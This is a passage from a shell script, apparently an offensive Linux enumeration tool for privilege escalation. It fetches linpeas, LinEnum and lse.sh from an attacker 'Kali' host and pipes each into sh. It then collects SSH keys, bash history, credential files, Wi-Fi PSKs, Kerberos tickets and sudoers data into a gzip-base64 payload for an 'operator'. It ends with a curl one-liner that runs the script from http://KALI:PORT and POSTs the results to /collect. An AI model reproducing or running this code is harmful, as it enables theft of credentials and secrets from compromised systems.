BACKUP_FILES=$(timeout 30 find /var /opt /srv /tmp /home /root -xdev \
    \( -name "*.sql" -o -name "*.sql.gz" -o -name "*.dump" -o -name "*.tar.gz" \
       -o -name "*.tar.bz2" -o -name "dump.rdb" -o -name "*.kdbx" -o -name "*.zip" \) \
    -size +1c 2>/dev/null | grep -vE 'node_modules|\.cache' | head -30)

# ─── D-Bus services list (advanced manual vector) ─────────────────────────
DBUS_SERVICES=""
if command -v busctl >/dev/null 2>&1; then
    DBUS_SERVICES=$(timeout 5 busctl --no-pager --no-legend list 2>/dev/null | head -30)
fi

# ─── kernel config flags ──────────────────────────────────────────────────
KCFG=""
if [ -r "/boot/config-$(uname -r)" ]; then
    KCFG=$(grep -E 'CONFIG_USER_NS|CONFIG_NF_TABLES|CONFIG_UNPRIVILEGED_USERNS_CLONE|CONFIG_OVERLAY_FS' "/boot/config-$(uname -r)" 2>/dev/null)
elif [ -r /proc/config.gz ] && command -v zcat >/dev/null 2>&1; then
    KCFG=$(zcat /proc/config.gz 2>/dev/null | grep -E 'CONFIG_USER_NS|CONFIG_NF_TABLES|CONFIG_UNPRIVILEGED_USERNS_CLONE|CONFIG_OVERLAY_FS')
fi

# ─── auto-fetch + run enum tools (LSE / LinEnum / linpeas) ────────────────
LSE_OUTPUT=""
LINENUM_OUTPUT=""
LINPEAS_OUTPUT=""

if [ -n "$KALI_BASE" ]; then
    >&2 printf '[*] Kali base detected: %s — auto-fetching enum scripts...\n' "$KALI_BASE"
    # LSE
    >&2 printf '[*] Running lse.sh (timeout %ss)...\n' "$LSE_TIMEOUT"
    _lse=$(fetch "$KALI_BASE/lse.sh")
    if [ -n "$_lse" ]; then
        LSE_OUTPUT=$(printf '%s' "$_lse" | timeout "$LSE_TIMEOUT" sh -s -- -l2 -i 2>&1 | tr -d '\0')
    fi
    # LinEnum
    >&2 printf '[*] Running LinEnum.sh (timeout %ss)...\n' "$LINENUM_TIMEOUT"
    _le=$(fetch "$KALI_BASE/LinEnum.sh")
    if [ -n "$_le" ]; then
        LINENUM_OUTPUT=$(printf '%s' "$_le" | timeout "$LINENUM_TIMEOUT" sh -s -- -t 2>&1 | tr -d '\0')
    fi
    # linpeas — strip ANSI to keep output sane for the operator
    >&2 printf '[*] Running linpeas.sh (timeout %ss)...\n' "$LINPEAS_TIMEOUT"
    _lp=$(fetch "$KALI_BASE/linpeas.sh")
    if [ -n "$_lp" ]; then
        LINPEAS_OUTPUT=$(printf '%s' "$_lp" | TERM=dumb timeout "$LINPEAS_TIMEOUT" sh -s -- -a 2>&1 | \
            tr -d '\0' | sed 's/\x1b\[[0-9;]*[A-Za-z]//g')
    fi
fi

# ─── BUILD PAYLOAD ────────────────────────────────────────────────────────
PAYLOAD=$(cat <<PAYLOAD_EOF
SYSENUM_START
SYSENUM_VERSION=2.1
USER=$USER_NAME
UID=$USER_UID
GID=$USER_GID
GROUPS=$USER_GROUPS
HOSTNAME=$HOST_NAME
KERNEL=$KERNEL
KERNEL_MAJOR=$KERNEL_MAJOR
KERNEL_MINOR=$KERNEL_MINOR
KERNEL_PATCH=$KERNEL_PATCH
ARCH=$ARCH
DISTRO=$DISTRO
CONTAINER=$CONTAINER
SELINUX_STATUS=$SELINUX_STATUS
NOEXEC_TMP=$NOEXEC_TMP
KALI_IP_DETECTED=$KALI_IP
KALI_BASE=$KALI_BASE
SUDO_VERSION=$SUDO_VERSION
SUDO_NEEDS_PASS=$SUDO_NEEDS_PASS
SUDO_STATUS=$SUDO_STATUS
SUDO_RAW=$(printf '%s' "$SUDO_RAW" | b64)
SUDOERS_DIRECT=$(printf '%s' "$SUDOERS_DIRECT" | b64)
SUDOERS_MATCHING_USER=$(printf '%s' "$SUDOERS_MATCHING_USER" | b64)
SUDO_BINARY_DIRS=$(printf '%s' "$SUDO_BINARY_DIRS" | b64)
SUDO_NOPASS_PATHS=$(printf '%s' "$SUDO_NOPASS_PATHS" | b64)
SUID_FULL=$(printf '%s' "$SUID_FULL" | b64)
SGID_FULL=$(printf '%s' "$SGID_FULL" | b64)
WRITABLE_SUID=$(printf '%s' "$WRITABLE_SUID" | b64)
CAPS_LIST=$(printf '%s' "$CAPS_LIST" | b64)
PASSWD_WRITABLE=$PASSWD_WRITABLE
SHADOW_READABLE=$SHADOW_READABLE
SHADOW_WRITABLE=$SHADOW_WRITABLE
SUDOERS_WRITABLE=$SUDOERS_WRITABLE
CRONTAB_WRITABLE=$CRONTAB_WRITABLE
HOSTS_WRITABLE=$HOSTS_WRITABLE
WRITABLE_SENSITIVE=$WRITABLE_SENSITIVE
RUNNING_PROCS=$(printf '%s' "$RUNNING_PROCS" | b64)
ROOT_PROCS=$(printf '%s' "$ROOT_PROCS" | b64)
WRITABLE_RUNNING=$(printf '%s' "$WRITABLE_RUNNING" | b64)
CRON_ALL=$(printf '%s' "$CRON_ALL" | b64)
CRON_SCRIPT_PATHS=$(printf '%s' "$CRON_SCRIPT_PATHS" | b64)
WRITABLE_CRON_SCRIPTS=$(printf '%s' "$WRITABLE_CRON_SCRIPTS" | b64)
WRITABLE_SH=$(printf '%s' "$WRITABLE_SH" | b64)
SUDO_DIR_WRITABLE_SH=$(printf '%s' "$SUDO_DIR_WRITABLE_SH" | b64)
PATH_DIRS=$(printf '%s' "$PATH_DIRS" | b64)
PATH_HIJACK_RISK=$PATH_HIJACK_RISK
NFS_EXPORTS=$(printf '%s' "$NFS_EXPORTS" | b64)
DOCKER_SOCKET=$DOCKER_SOCKET
DOCKER_SOCKET_WRITABLE=$DOCKER_SOCKET_WRITABLE
DOCKER_BIN=$DOCKER_BIN
DOCKER_GROUP_MEMBERS=$(printf '%s' "$DOCKER_GROUP_MEMBERS" | b64)
LXD_GROUP_MEMBERS=$(printf '%s' "$LXD_GROUP_MEMBERS" | b64)
DISK_GROUP_MEMBERS=$(printf '%s' "$DISK_GROUP_MEMBERS" | b64)
ADM_GROUP_MEMBERS=$(printf '%s' "$ADM_GROUP_MEMBERS" | b64)
WHEEL_GROUP_MEMBERS=$(printf '%s' "$WHEEL_GROUP_MEMBERS" | b64)
SUDO_GROUP_MEMBERS=$(printf '%s' "$SUDO_GROUP_MEMBERS" | b64)
ALL_USER_GROUPS=$(printf '%s' "$ALL_USER_GROUPS" | b64)
SSH_KEYS=$(printf '%s' "$SSH_KEYS" | b64)
BASH_HISTORY=$(printf '%s' "$BASH_HISTORY" | b64)
INTERESTING_FILES=$(printf '%s' "$INTERESTING_FILES" | b64)
MOTD_WRITABLE=$(printf '%s' "$MOTD_WRITABLE" | b64)
TIMERS=$(printf '%s' "$TIMERS" | b64)
WRITABLE_SYSTEMD=$(printf '%s' "$WRITABLE_SYSTEMD" | b64)
PROC_CREDS=$(printf '%s' "$PROC_CREDS" | b64)
KERNEL_CONFIG=$(printf '%s' "$KCFG" | b64)
LSE_OUTPUT=$(printf '%s' "$LSE_OUTPUT" | b64)
LINENUM_OUTPUT=$(printf '%s' "$LINENUM_OUTPUT" | b64)
LINPEAS_OUTPUT=$(printf '%s' "$LINPEAS_OUTPUT" | b64)
LD_PRELOAD_WRITABLE=$LD_PRELOAD_WRITABLE
LD_PRELOAD_EXISTS=$LD_PRELOAD_EXISTS
LD_SO_CONFD_WRITABLE=$(printf '%s' "$LD_SO_CONFD_WRITABLE" | b64)
SUDOERSD_WRITABLE=$(printf '%s' "$SUDOERSD_WRITABLE" | b64)
SUDO_TOKEN_VALID=$SUDO_TOKEN_VALID
SSHD_CONFIG_WRITABLE=$SSHD_CONFIG_WRITABLE
SSHD_AUTHKEY_CMD=$(printf '%s' "$SSHD_AUTHKEY_CMD" | b64)
SSH_AGENT_SOCKS=$(printf '%s' "$SSH_AGENT_SOCKS" | b64)
POLKIT_WRITABLE=$(printf '%s' "$POLKIT_WRITABLE" | b64)
PAM_WRITABLE=$(printf '%s' "$PAM_WRITABLE" | b64)
NSS_WRITABLE=$(printf '%s' "$NSS_WRITABLE" | b64)
LISTENING=$(printf '%s' "$LISTENING" | b64)
RECENT_60MIN=$(printf '%s' "$RECENT_60MIN" | b64)
RECENT_24H=$(printf '%s' "$RECENT_24H" | b64)
PROFILE_WRITABLE=$(printf '%s' "$PROFILE_WRITABLE" | b64)
SKEL_WRITABLE=$(printf '%s' "$SKEL_WRITABLE" | b64)
OTHER_USER_RC=$(printf '%s' "$OTHER_USER_RC" | b64)
LOGROTATE_WRITABLE=$(printf '%s' "$LOGROTATE_WRITABLE" | b64)
PYSITE_WRITABLE=$(printf '%s' "$PYSITE_WRITABLE" | b64)
SECURITY_WRITABLE=$(printf '%s' "$SECURITY_WRITABLE" | b64)
LSMOD=$(printf '%s' "$LSMOD" | b64)
NFS_MOUNTED=$(printf '%s' "$NFS_MOUNTED" | b64)
OVERLAY_MOUNTS=$(printf '%s' "$OVERLAY_MOUNTS" | b64)
CRON_PATH_OVERRIDE=$(printf '%s' "$CRON_PATH_OVERRIDE" | b64)
CRED_FILES=$(printf '%s' "$CRED_FILES" | b64)
NM_PSK=$(printf '%s' "$NM_PSK" | b64)
KRB_TICKETS=$(printf '%s' "$KRB_TICKETS" | b64)
MAILSPOOL=$(printf '%s' "$MAILSPOOL" | b64)
SCREEN_TMUX=$(printf '%s' "$SCREEN_TMUX" | b64)
CUSTOM_SUID_STRINGS=$(printf '%s' "$CUSTOM_SUID_STRINGS" | b64)
ROOT_FD_LEAKS=$(printf '%s' "$ROOT_FD_LEAKS" | b64)
BACKUP_FILES=$(printf '%s' "$BACKUP_FILES" | b64)
DBUS_SERVICES=$(printf '%s' "$DBUS_SERVICES" | b64)
SYSENUM_END
PAYLOAD_EOF
)

# ─── FINAL EMISSION ───────────────────────────────────────────────────────
ENCODED=$(printf '%s' "$PAYLOAD" | gzb64)
echo ""
echo "SYSENUM_DATA:$ENCODED"
echo ""
echo "[*] Copy the SYSENUM_DATA line above into sysenum_operator.html"
echo "[*] Or pipe directly:"
echo "    curl -s http://KALI:PORT/sc.sh | sh | curl -s -X POST --data-binary @- http://KALI:PORT/collect"
